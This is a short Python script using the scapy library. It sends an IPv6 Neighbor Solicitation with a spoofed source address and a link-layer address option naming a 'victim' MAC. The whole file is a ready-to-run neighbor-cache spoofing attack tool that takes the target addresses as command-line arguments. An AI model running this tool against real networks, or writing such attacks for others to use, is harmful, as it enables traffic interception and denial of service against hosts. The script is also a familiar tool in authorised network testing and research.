#!/usr/bin/python
import sys
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import send

# Ask user to insert value
if len(sys.argv) == 5:
    fake_ip = sys.argv[1]
    dst_ip = sys.argv[2]
    victim_ip = sys.argv[3]
    victim_mac = sys.argv[4]
else:
    print("Please insert:\n 1. Spoofed source IPv6\n 2. Destination IPv6\n"
          " 3. Victim's IPv6\n 4. Victim MAC or any MAC")
    sys.exit(1)

# Generate packet
base = IPv6()
base.dst = dst_ip
base.src = fake_ip

packet1 = base/ICMPv6ND_NS(tgt=victim_ip)/\
         ICMPv6NDOptSrcLLAddr(lladdr=victim_mac)
send(packet1, verbose=False)
print("Spoofing MAC address in NS to the host: " + victim_ip)
